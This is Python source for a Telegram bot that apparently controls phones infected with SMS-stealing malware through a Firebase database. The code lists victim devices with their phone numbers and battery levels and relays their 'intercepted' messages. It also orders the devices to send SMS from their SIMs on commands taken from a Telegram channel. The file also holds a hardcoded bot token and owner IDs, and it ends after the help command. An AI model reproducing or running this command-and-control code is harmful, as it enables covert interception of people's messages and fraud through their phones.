import asyncio
import aiohttp
import json
import logging
import os
import re
import time
from typing import Optional, Dict, Any, Union, List

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ---------------------------- Configuration ---------------------------------
TOKEN = "8601619894:AAGCEbKN7DFIBLmxcmXMnX48SdrhElYU_80"  # Replace with your bot token
DATA_FILE = "user_data.json"
POLL_INTERVAL = 5
AUTO_PAUSE_MINUTES = 5

# Owner IDs (hardcoded)
OWNER_IDS = {5311223486, 7759665144}  # Telegram user IDs

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------------------------- Data Storage ----------------------------------
def load_user_data() -> Dict[str, Any]:
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    # Initialize with authorized_admins list
    return {"authorized_admins": []}

def save_user_data(data: Dict[str, Any]) -> None:
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

user_data = load_user_data()

def get_user(user_id: int) -> dict:
    uid = str(user_id)
    if uid not in user_data:
        user_data[uid] = {
            "firebase_url": "",
            "secret": "",
            "device_id": "",
            "channel_id": None,
            "forward_number": "",
            "sim_selection": 1,
            "response_format": "new",
            "monitor_active": False,
            "last_message_key": "",
            "last_seen_time": 0,
        }
        save_user_data(user_data)
    return user_data[uid]

def save_user(uid: str, data: dict) -> None:
    user_data[uid] = data
    save_user_data(user_data)

# ---------------------------- Admin Helpers --------------------------------
def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def is_admin(user_id: int) -> bool:
    if is_owner(user_id):
        return True
    admins = user_data.get("authorized_admins", [])
    return str(user_id) in admins

def get_authorized_admins() -> List[str]:
    return user_data.get("authorized_admins", [])

def add_authorized_admin(admin_id: int) -> None:
    admins = set(get_authorized_admins())
    admins.add(str(admin_id))
    user_data["authorized_admins"] = list(admins)
    save_user_data(user_data)

def remove_authorized_admin(admin_id: int) -> None:
    admins = set(get_authorized_admins())
    admins.discard(str(admin_id))
    user_data["authorized_admins"] = list(admins)
    save_user_data(user_data)

async def notify_admins(context: ContextTypes.DEFAULT_TYPE, actor_id: int, action: str, details: str = ""):
    """Send audit notification to all owners and admins except the actor."""
    message = (
        f"📢 *Admin Audit Log*\n\n"
        f"👤 User: {actor_id}\n"
        f"⚙️ Action: {action}\n"
        f"🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
        f"{details}"
    )
    recipients = set()
    for owner in OWNER_IDS:
        recipients.add(owner)
    for admin_str in get_authorized_admins():
        recipients.add(int(admin_str))
    # Remove the actor
    recipients.discard(actor_id)
    for recipient in recipients:
        try:
            await context.bot.send_message(chat_id=recipient, text=message, parse_mode="Markdown")
        except Exception as e:
            logger.error(f"Failed to notify admin {recipient}: {e}")

# ---------------------------- Firebase Helpers (unchanged) -----------------
async def firebase_get(url: str, secret: str, path: str) -> Optional[dict]:
    base = url.rstrip('/')
    auth = f"?auth={secret}" if secret else ""
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base}/{path}.json{auth}") as resp:
            if resp.status == 404:
                return None
            if resp.status != 200:
                raise Exception(f"Firebase GET error {resp.status}")
            return await resp.json()

async def firebase_put(url: str, secret: str, path: str, data: dict) -> dict:
    base = url.rstrip('/')
    auth = f"?auth={secret}" if secret else ""
    full_url = f"{base}/{path}.json{auth}"
    logger.info(f"Firebase PUT to: {full_url}")
    logger.info(f"Payload: {json.dumps(data)}")
    async with aiohttp.ClientSession() as session:
        async with session.put(full_url, json=data) as resp:
            response_text = await resp.text()
            logger.info(f"Firebase response status: {resp.status}, body: {response_text[:200]}")
            if resp.status not in (200, 201):
                raise Exception(f"Firebase PUT error {resp.status}: {response_text}")
            return await resp.json() if response_text else {}

async def send_sms_to_firebase(url: str, secret: str, device_id: str, to: str, message: str, from_sim: Union[int, str]) -> dict:
    sim_index = 1 if from_sim == 1 or from_sim == "1" else 2
    payload = {"from": sim_index, "to": to, "message": message, "isSended": False}
    path = f"clients/{device_id}/webhookEvent/sendSms"
    return await firebase_put(url, secret, path, payload)

async def send_sms_with_sim_choice(user: dict, to: str, message: str) -> tuple:
    sim = user.get("sim_selection", 1)
    device_id = user["device_id"]
    url = user["firebase_url"]
    secret = user["secret"]
    errors = []
    success = 0

    if sim == 1 or sim == 2:
        try:
            await send_sms_to_firebase(url, secret, device_id, to, message, sim)
            success = 1
        except Exception as e:
            errors.append(str(e))
    elif sim == "both":
        try:
            await send_sms_to_firebase(url, secret, device_id, to, message, 1)
            success += 1
        except Exception as e:
            errors.append(f"SIM1: {str(e)}")
        try:
            await send_sms_to_firebase(url, secret, device_id, to, message, 2)
            success += 1
        except Exception as e:
            errors.append(f"SIM2: {str(e)}")
    else:
        try:
            await send_sms_to_firebase(url, secret, device_id, to, message, 1)
            success = 1
        except Exception as e:
            errors.append(str(e))

    error_msg = "; ".join(errors) if errors else None
    return success, error_msg

async def get_devices(url: str, secret: str) -> list:
    data = await firebase_get(url, secret, "clients")
    if not data:
        return []
    devices = []
    for dev_id, info in data.items():
        if not isinstance(info, dict):
            continue
        sims = info.get("sims", [])
        if isinstance(sims, dict):
            sims = list(sims.values())
        name = info.get("modelName") or info.get("model") or dev_id
        phone = info.get("mobNo") or (sims[0].get("phoneNumber") if sims else "—")
        status = bool(info.get("status"))
        devices.append({
            "id": dev_id,
            "name": name,
            "phone": phone,
            "status": status,
            "battery": info.get("battery", "0%"),
        })
    return devices

async def get_last_message_key(url: str, secret: str, device_id: str) -> Optional[str]:
    data = await firebase_get(url, secret, f"messages/{device_id}")
    if not data:
        return None
    keys = list(data.keys())
    return max(keys) if keys else None

async def fetch_new_messages(url: str, secret: str, device_id: str, after_key: str) -> list:
    data = await firebase_get(url, secret, f"messages/{device_id}")
    if not data:
        return []
    new_msgs = []
    for key, msg in data.items():
        if key > after_key:
            new_msgs.append((key, msg))
    new_msgs.sort(key=lambda x: x[0])
    return new_msgs

# ---------------------------- Reply & Inline Keyboards -----------------------
def get_main_keyboard():
    keyboard = [
        ["/setfirebase", "/setdevice", "/edit_device", "/setsim"],
        ["/setchannel", "/setforward", "/setformat"],
        ["/startmonitor", "/stopmonitor", "/resumemonitor"],
        ["/monitorstatus", "/status", "/test"],
        ["/admins", "/adminpanel", "/help", "/cancel"]
    ]
    # Only show admin commands to admins/owners
    # but we keep them on keyboard for simplicity; they will check permissions internally
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

def get_sim_keyboard():
    keyboard = [
        [InlineKeyboardButton("📱 SIM 1", callback_data="sim_1"),
         InlineKeyboardButton("📱 SIM 2", callback_data="sim_2")],
        [InlineKeyboardButton("🔁 BOTH", callback_data="sim_both")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_format_keyboard():
    keyboard = [
        [InlineKeyboardButton("📜 Old Format", callback_data="fmt_old"),
         InlineKeyboardButton("🆕 New Format", callback_data="fmt_new")]
    ]
    return InlineKeyboardMarkup(keyboard)

def format_sms_notification(sender: str, text: str, format_choice: str = "new") -> str:
    if format_choice == "old":
        return (
            f"📱 SMS Intercepted\n"
            f"━━━━━━━━━━━━━━\n"
            f"📞 To: {sender}\n"
            f"💬 Message: {text}\n\n"
            f"📋 One-tap copy:\n"
            f"`{sender} | {text}`"
        )
    else:
        return (
            f"📱 Intercepted Outgoing SMS\n\n"
            f"To (Tap to copy):\n"
            f"`{sender}`\n\n"
            f"Body (Tap to copy):\n"
            f"`{text}`"
        )

# ---------------------------- Text Router (Private Chat) --------------------
async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_state = context.user_data if context.user_data is not None else {}
    text = update.message.text.strip()
    logger.info(f"Text router: received '{text}', user_state keys = {list(user_state.keys())}")

    if user_state.get("expecting_manual_device_id"):
        dev_id = text
        user_id = update.effective_user.id
        user = get_user(user_id)
        user["device_id"] = dev_id
        save_user(str(user_id), user)
        context.user_data.pop("expecting_manual_device_id", None)
        await update.message.reply_text(
            f"✅ Device ID manually set to: `{dev_id}`\n\nNow select the SIM to use:",
            parse_mode="Markdown",
            reply_markup=get_sim_keyboard()
        )
        return

    if user_state.get("expecting_firebase_url"):
        await handle_firebase_input(update, context)
    elif user_state.get("expecting_firebase_secret"):
        await handle_firebase_input(update, context)
    elif user_state.get("expecting_device_id"):
        await handle_manual_device_id(update, context)
    elif user_state.get("expecting_channel"):
        await handle_channel_input(update, context)
    else:
        await update.message.reply_text("Use the buttons below:", reply_markup=get_main_keyboard())

# ---------------------------- Firebase Input Handlers -----------------------
async def handle_firebase_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("expecting_firebase_url"):
        url = update.message.text.strip()
        context.user_data["firebase_url_temp"] = url
        context.user_data["expecting_firebase_url"] = False
        context.user_data["expecting_firebase_secret"] = True
        await update.message.reply_text(
            "Now send your *Database Secret key*.\n"
            "Find it in Firebase Console → Project Settings → Service Accounts → Database Secrets.",
            parse_mode="Markdown"
        )
    elif context.user_data.get("expecting_firebase_secret"):
        secret = update.message.text.strip()
        url = context.user_data.pop("firebase_url_temp", "")
        context.user_data.pop("expecting_firebase_secret", False)
        if not url:
            await update.message.reply_text("❌ Something went wrong. Use /setfirebase again.")
            return
        user_id = update.effective_user.id
        user = get_user(user_id)
        try:
            await firebase_get(url, secret, "clients")
        except Exception as e:
            await update.message.reply_text(f"❌ Firebase test failed: {str(e)}")
            return
        user["firebase_url"] = url
        user["secret"] = secret
        save_user(str(user_id), user)
        devices = await get_devices(url, secret)
        online = sum(1 for d in devices if d["status"])
        await update.message.reply_text(
            f"✅ Firebase URL set!\n{url}\n\n📊 {len(devices)} client(s) found, {online} online\n\nNext: /setdevice",
            reply_markup=get_main_keyboard()
        )
        # Audit notification
        await notify_admins(context, user_id, "Firebase configured", f"URL: {url}")

# ---------------------------- Manual Device ID ------------------------------
async def handle_manual_device_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    dev_id = update.message.text.strip()
    user_id = update.effective_user.id
    user = get_user(user_id)
    user["device_id"] = dev_id
    save_user(str(user_id), user)
    context.user_data.pop("expecting_device_id", None)
    await update.message.reply_text(
        f"✅ Device ID set: `{dev_id}`\n\nNow select the SIM to use:",
        parse_mode="Markdown",
        reply_markup=get_sim_keyboard()
    )

# ---------------------------- SIM Selection Callback ------------------------
async def sim_selection_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    user = get_user(user_id)
    data = query.data

    if data == "sim_1":
        user["sim_selection"] = 1
        msg = "✅ SIM selected: SIM 1"
    elif data == "sim_2":
        user["sim_selection"] = 2
        msg = "✅ SIM selected: SIM 2"
    elif data == "sim_both":
        user["sim_selection"] = "both"
        msg = "✅ SIM selected: BOTH"
    else:
        await query.edit_message_text("❌ Unknown option.")
        return

    save_user(str(user_id), user)
    logger.info(f"User {user_id} set SIM selection to {user['sim_selection']}")

    try:
        await query.message.delete()
    except Exception:
        pass

    await context.bot.send_message(
        chat_id=user_id,
        text=msg + "\n\nUse the buttons below:",
        reply_markup=get_main_keyboard()
    )

# ---------------------------- Channel Handling ------------------------------
async def setchannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    current = user.get("channel_id") or "not set"
    args = context.args
    if args:
        chan_input = " ".join(args)
        await process_channel_setting(update, context, chan_input)
    else:
        context.user_data["expecting_channel"] = True
        await update.message.reply_text(
            f"📢 Your current channel/group: `{current}`\n\n"
            "Send a channel ID, group ID, or @username:\n"
            "  • `-1001234567890`  (channel or supergroup)\n"
            "  • `@mychannel`\n\n"
            "ℹ️ The bot must be an admin in that chat to read messages.\n\n"
            "Send `clear` to stop watching. Use /cancel to abort.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

async def process_channel_setting(update: Update, context: ContextTypes.DEFAULT_TYPE, chan_input: str):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if chan_input.lower() == "clear":
        user["channel_id"] = None
        save_user(str(user_id), user)
        await update.message.reply_text("✅ Channel/group cleared.", reply_markup=get_main_keyboard())
        return
    try:
        try:
            parsed_id = int(chan_input)
            chat = await context.bot.get_chat(parsed_id)
        except ValueError:
            username = chan_input.lstrip('@')
            chat = await context.bot.get_chat(f"@{username}")
        chat_id = chat.id
        chat_title = chat.title or chat.first_name or "Unknown"
        user["channel_id"] = chat_id
        save_user(str(user_id), user)
        await update.message.reply_text(
            f"✅ Channel saved\n"
            f"Title: {chat_title}\n"
            f"ID: `{chat_id}`\n\n"
            "Make sure I am an admin with permission to read messages.\n"
            "💾 Saved — will be remembered next session.\n\n"
            "👉 Use /startmonitor to begin monitoring incoming SMS.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        logger.info(f"User {user_id} set channel to {chat_id} ({chat_title})")
    except Exception as e:
        logger.error(f"Channel validation failed for {chan_input}: {e}")
        await update.message.reply_text(
            f"❌ Cannot access this chat.\n"
            f"Make sure:\n"
            f"• The bot is added as admin in the channel/group.\n"
            f"• For a private channel, the bot must be invited and given 'Read Messages' permission.\n"
            f"• The ID/username is correct.\n\n"
            f"Error: {str(e)}",
            reply_markup=get_main_keyboard()
        )

async def handle_channel_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chan_input = update.message.text.strip()
    context.user_data.pop("expecting_channel", None)
    await process_channel_setting(update, context, chan_input)

# ---------------------------- Channel Message Parser ------------------------
def parse_sms_from_channel(text: str) -> tuple:
    to_number = None
    message = None
    clean_text = text.replace('`', '')
    lines = [line.strip() for line in clean_text.split('\n') if line.strip()]

    for i, line in enumerate(lines):
        # New format pattern: "To (Tap to copy):"
        if re.search(r'To\s*\([^)]*\):?', line, re.IGNORECASE):
            parts = re.split(r'To\s*\([^)]*\):?', line, flags=re.IGNORECASE, maxsplit=1)
            if len(parts) > 1 and parts[1].strip():
                to_number = parts[1].strip()
            elif i + 1 < len(lines):
                to_number = lines[i + 1].strip()

        # New format pattern: "Body (Tap to copy):"
        elif re.search(r'Body\s*\([^)]*\):?', line, re.IGNORECASE):
            parts = re.split(r'Body\s*\([^)]*\):?', line, flags=re.IGNORECASE, maxsplit=1)
            if len(parts) > 1 and parts[1].strip():
                message = parts[1].strip()
            elif i + 1 < len(lines):
                message = lines[i + 1].strip()

        # Old format patterns: "📞 To: ..." or "To: ..."
        elif re.match(r'^(?:📞\s*)?To\s*:', line, re.IGNORECASE):
            parts = re.split(r'^.+?:\s*', line, maxsplit=1)
            if len(parts) == 2 and parts[1].strip():
                to_number = parts[1].strip()

        # Old format patterns: "💬 Message: ..." or "Message: ..."
        elif re.match(r'^(?:💬\s*)?Message\s*:', line, re.IGNORECASE):
            parts = re.split(r'^.+?:\s*', line, maxsplit=1)
            if len(parts) == 2 and parts[1].strip():
                message = parts[1].strip()

    if not to_number or not message:
        for line in lines:
            if not to_number and line.lower().startswith('to:'):
                to_number = line.split(':', 1)[1].strip()
            elif not message and line.lower().startswith('message:'):
                message = line.split(':', 1)[1].strip()

    if not to_number or not message:
        for line in lines:
            if '|' in line and ('+' in line or any(c.isdigit() for c in line[:15])):
                parts = line.split('|', 1)
                if len(parts) == 2:
                    to_number = parts[0].strip()
                    message = parts[1].strip()
                break

    return to_number, message

# ---------------------------- Channel/Group Message Handler ----------------
async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.channel_post or update.message
    if not msg:
        return
    chat_id = msg.chat.id
    target_user = None
    for uid_str, user in user_data.items():
        if uid_str == "authorized_admins":
            continue
        saved_id = user.get("channel_id")
        if saved_id is not None and str(saved_id) == str(chat_id):
            target_user = (uid_str, user)
            break
    if not target_user:
        logger.debug(f"No user configured for chat {chat_id}")
        return
    uid_str, user = target_user
    logger.info(f"Received message in monitored chat {chat_id} for user {uid_str}")
    text = msg.text or msg.caption or ""
    if not text:
        return
    to_number, message = parse_sms_from_channel(text)
    if not to_number or not message:
        logger.info(f"Could not parse to_number or message from: {text[:100]}")
        return
    if not user.get("firebase_url") or not user.get("secret") or not user.get("device_id"):
        await context.bot.send_message(chat_id, "❌ Bot not fully configured (Firebase URL/Secret/Device missing).")
        return
    try:
        success, error = await send_sms_with_sim_choice(user, to_number, message)
        if success == 0:
            await context.bot.send_message(chat_id, f"❌ SMS sending failed: {error}")
        elif success == 1:
            await context.bot.send_message(chat_id, f"✅ SMS sent to {to_number} via selected SIM")
        elif success == 2:
            await context.bot.send_message(chat_id, f"✅ SMS sent to {to_number} via BOTH SIMs")
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Failed to send SMS: {str(e)[:200]}")

# ---------------------------- Admin Command Handlers -----------------------
async def authorize(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/authorize <user_id> - Add a user as admin (owner only)"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only bot owners can use this command.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/authorize <user_id>`", parse_mode="Markdown")
        return
    try:
        new_admin_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")
        return
    if is_owner(new_admin_id):
        await update.message.reply_text("❌ Owner is already an administrator.")
        return
    add_authorized_admin(new_admin_id)
    await update.message.reply_text(f"✅ User `{new_admin_id}` is now an admin.", parse_mode="Markdown")
    # Notify other admins
    await notify_admins(context, user_id, "Admin added", f"New admin ID: {new_admin_id}")

async def unauthorize(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/unauthorize <user_id> - Remove admin privileges (owner only)"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only bot owners can use this command.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/unauthorize <user_id>`", parse_mode="Markdown")
        return
    try:
        admin_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return
    if is_owner(admin_id):
        await update.message.reply_text("❌ Cannot remove owner rights.")
        return
    remove_authorized_admin(admin_id)
    await update.message.reply_text(f"✅ User `{admin_id}` is no longer an admin.", parse_mode="Markdown")
    await notify_admins(context, user_id, "Admin removed", f"Removed admin ID: {admin_id}")

async def admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show list of all administrators (owners + authorized)"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    owners = list(OWNER_IDS)
    authorized = get_authorized_admins()
    text = "👥 *Administrators*\n\n"
    text += "*Owners:*\n"
    for o in owners:
        text += f"• `{o}`\n"
    if authorized:
        text += "\n*Authorized Admins:*\n"
        for a in authorized:
            text += f"• `{a}`\n"
    else:
        text += "\nNo authorized admins.\n"
    await update.message.reply_text(text, parse_mode="Markdown")

async def adminpanel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics panel (total users, admins, active monitors, connected devices)"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    total_users = 0
    active_monitors = 0
    devices_set = 0
    for key, val in user_data.items():
        if key == "authorized_admins":
            continue
        if isinstance(val, dict):
            total_users += 1
            if val.get("monitor_active"):
                active_monitors += 1
            if val.get("device_id"):
                devices_set += 1
    total_admins = len(OWNER_IDS) + len(get_authorized_admins())
    text = (
        "📊 *Admin Panel*\n\n"
        f"👥 Total users: {total_users}\n"
        f"👑 Total admins: {total_admins}\n"
        f"🟢 Active monitors: {active_monitors}\n"
        f"📱 Devices configured: {devices_set}\n"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

# ---------------------------- Existing Command Handlers (updated permissions) --------------
async def setsim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    await update.message.reply_text(
        "📱 Select which SIM to use for sending SMS:\n\n"
        "• SIM 1 – use first SIM card\n"
        "• SIM 2 – use second SIM card\n"
        "• BOTH – send SMS from both SIMs",
        reply_markup=get_sim_keyboard()
    )

async def setformat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    current_fmt = user.get("response_format", "new")
    fmt_label = "🆕 New Format" if current_fmt == "new" else "📜 Old Format"
    await update.message.reply_text(
        f"🎨 *Response Format Settings*\n\n"
        f"Currently selected: *{fmt_label}*\n\n"
        "Choose which response format to use for intercepted SMS notifications:",
        parse_mode="Markdown",
        reply_markup=get_format_keyboard()
    )

async def format_selection_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    user = get_user(user_id)
    data = query.data

    if data == "fmt_old":
        user["response_format"] = "old"
        msg = "✅ Response format set to: 📜 Old Format"
    elif data == "fmt_new":
        user["response_format"] = "new"
        msg = "✅ Response format set to: 🆕 New Format"
    else:
        await query.edit_message_text("❌ Unknown option.")
        return

    save_user(str(user_id), user)
    logger.info(f"User {user_id} set response_format to {user['response_format']}")

    try:
        await query.message.delete()
    except Exception:
        pass

    await context.bot.send_message(
        chat_id=user_id,
        text=msg + "\n\nUse the buttons below:",
        reply_markup=get_main_keyboard()
    )

async def edit_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data["expecting_manual_device_id"] = True
    await update.message.reply_text(
        "✏️ Send the new Device ID (the Firebase key of the client).\n"
        "Use /cancel to abort.",
        reply_markup=get_main_keyboard()
    )

async def setfirebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if args and len(args) >= 2:
        url = args[0]
        secret = args[1]
        if not url.startswith("http"):
            await update.message.reply_text("❌ URL must start with http:// or https://")
            return
        try:
            await firebase_get(url, secret, "clients")
        except Exception as e:
            await update.message.reply_text(f"❌ Firebase test failed: {str(e)}")
            return
        user_id = update.effective_user.id
        user = get_user(user_id)
        user["firebase_url"] = url
        user["secret"] = secret
        save_user(str(user_id), user)
        devices = await get_devices(url, secret)
        online = sum(1 for d in devices if d["status"])
        await update.message.reply_text(
            f"✅ Firebase URL set!\n{url}\n\n📊 {len(devices)} client(s) found, {online} online\n\nNext: /setdevice",
            reply_markup=get_main_keyboard()
        )
        # Audit notification
        await notify_admins(context, user_id, "Firebase configured", f"URL: {url}")
    else:
        context.user_data["expecting_firebase_url"] = True
        await update.message.reply_text(
            "🔥 *Firebase URL: not set*\n\n"
            "Send your Firebase Realtime Database URL:\n"
            "`https://your-project-default-rtdb.firebaseio.com`\n\n"
            "Use /cancel to abort.",
            parse_mode="Markdown"
        )

async def setdevice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user["firebase_url"] or not user["secret"]:
        await update.message.reply_text("❌ Firebase not set. Use /setfirebase first.")
        return
    devices = await get_devices(user["firebase_url"], user["secret"])
    if not devices:
        await update.message.reply_text("❌ No devices found in Firebase.")
        return
    keyboard = []
    for dev in devices:
        status_icon = "🟢" if dev["status"] else "⚫"
        label = f"{status_icon} {dev['name']} ({dev['phone']})"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev['id']}")])
    keyboard.append([InlineKeyboardButton("✏️ Enter Device ID manually", callback_data="dev_manual")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"{len(devices)} device(s) found.\n"
        f"Currently selected: {user['device_id'] or 'none selected'}\n\n"
        "Tap a device to select it.\n"
        "If your device isn't listed, tap 'Enter Device ID manually'.",
        reply_markup=reply_markup
    )
    context.user_data["temp_devices"] = devices

async def device_selection_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    user = get_user(user_id)
    data = query.data
    if data == "dev_manual":
        context.user_data["expecting_device_id"] = True
        await query.edit_message_text(
            "Send the device ID (the Firebase key of the client).\n"
            "Use /cancel to abort."
        )
        return
    if data.startswith("dev_"):
        dev_id = data[4:]
        user["device_id"] = dev_id
        save_user(str(user_id), user)
        devices = await get_devices(user["firebase_url"], user["secret"])
        dev = next((d for d in devices if d["id"] == dev_id), None)
        status_icon = "🟢" if dev and dev["status"] else "⚫"
        await query.edit_message_text(
            f"✅ Device selected:\n{status_icon} `{dev_id}`\n\n"
            f"Now select the SIM to use:",
            parse_mode="Markdown",
            reply_markup=get_sim_keyboard()
        )

async def setforward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/setforward +91XXXXXXXXXX`\nSend `clear` to remove.", parse_mode="Markdown")
        return
    number = args[0].strip()
    if number.lower() == "clear":
        user["forward_number"] = ""
        save_user(str(user_id), user)
        await update.message.reply_text("✅ Forward number cleared.", reply_markup=get_main_keyboard())
    else:
        user["forward_number"] = number
        save_user(str(user_id), user)
        await update.message.reply_text(f"✅ Forward number set to {number}", reply_markup=get_main_keyboard())

async def startmonitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user["firebase_url"] or not user["secret"]:
        await update.message.reply_text("❌ Firebase not set. Use /setfirebase first.")
        return
    if not user["device_id"]:
        await update.message.reply_text("❌ Device not set. Use /setdevice first.")
        return
    if user.get("monitor_active"):
        await update.message.reply_text("Monitoring already active.")
        return
    last_key = await get_last_message_key(user["firebase_url"], user["secret"], user["device_id"])
    user["last_message_key"] = last_key or ""
    user["monitor_active"] = True
    user["last_seen_time"] = time.time()
    save_user(str(user_id), user)
    if not context.application.bot_data.get("monitor_task"):
        task = asyncio.create_task(monitor_loop(context.application))
        context.application.bot_data["monitor_task"] = task
    await update.message.reply_text(
        "👁 Monitoring started.\n\nIf no new SMS for 5 minutes, it will auto-pause.\nUse /stopmonitor to pause manually.",
        reply_markup=get_main_keyboard()
    )

async def stopmonitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user.get("monitor_active"):
        await update.message.reply_text("Monitoring is not active.")
        return
    user["monitor_active"] = False
    save_user(str(user_id), user)
    await update.message.reply_text("⏸ Monitoring paused. Use /resumemonitor to continue.", reply_markup=get_main_keyboard())

async def resumemonitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if user.get("monitor_active"):
        await update.message.reply_text("Monitoring already active.")
        return
    user["monitor_active"] = True
    user["last_seen_time"] = time.time()
    last_key = await get_last_message_key(user["firebase_url"], user["secret"], user["device_id"])
    user["last_message_key"] = last_key or user.get("last_message_key", "")
    save_user(str(user_id), user)
    await update.message.reply_text("✅ Monitoring resumed.", reply_markup=get_main_keyboard())

async def monitorstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    status = "🟢 running" if user.get("monitor_active") else "⚫ stopped"
    await update.message.reply_text(f"Monitor state: {status}", reply_markup=get_main_keyboard())

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    sim_display = "SIM 1" if user["sim_selection"] == 1 else ("SIM 2" if user["sim_selection"] == 2 else "BOTH")
    fmt_display = "📜 Old Format" if user.get("response_format") == "old" else "🆕 New Format"
    text = (
        "📋 *Your Settings*\n\n"
        f"🔥 Firebase  : `{user['firebase_url'] or 'not set'}`\n"
        f"📱 Device    : {user['device_id'] or 'not set'}\n"
        f"📶 SIM       : {sim_display}\n"
        f"🎨 Format    : {fmt_display}\n"
        f"📢 Channel   : {user['channel_id'] or 'not set'}\n"
        f"📤 Forward   : {user['forward_number'] or 'not set'}\n"
        f"👁 Monitor   : {'🟢 running' if user.get('monitor_active') else '⚫ stopped'}"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_main_keyboard())

async def test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user["firebase_url"] or not user["secret"]:
        await update.message.reply_text("❌ Firebase not configured.")
        return
    if not user["device_id"]:
        await update.message.reply_text("❌ Device not selected.")
        return
    args = " ".join(context.args)
    if not args or "|" not in args:
        await update.message.reply_text(
            "Usage: `/test +91XXXXXXXXXX|Your message`\n\n"
            "Example: `/test +919876543210|Hello`",
            parse_mode="Markdown"
        )
        return
    to_number, message = args.split("|", 1)
    to_number = to_number.strip()
    message = message.strip()
    try:
        success, error = await send_sms_with_sim_choice(user, to_number, message)
        if success == 0:
            await update.message.reply_text(f"❌ SMS failed: {error}", reply_markup=get_main_keyboard())
        elif success == 1:
            await update.message.reply_text(f"✅ SMS sent to {to_number} via selected SIM", reply_markup=get_main_keyboard())
        elif success == 2:
            await update.message.reply_text(f"✅ SMS sent to {to_number} via BOTH SIMs", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {str(e)}", reply_markup=get_main_keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📱 *Firebase SMS Bot*\n\n"
        "Use the buttons below to control the bot.\n\n"
        "*Channel post formats supported:*\n"
        "• `To: +91XXXXXXXXXX` / `Message: ...`\n"
        "• `📱 SMS Intercepted` block with 📞 To: and 💬 Message:\n"
        "• One‑tap copy line: `+91XXXXXXXXXX | message`\n\n"
        "Use /cancel to abort any ongoing operation.\n\n"
        "*Admin commands:*\n"
        "Only owners can use /authorize, /unauthorize.\n"
        "Admins can use /admins, /adminpanel."
    )
    await update.message.reply_text(help_text, parse_mode="Markdown", reply_markup=get_main_keyboard())

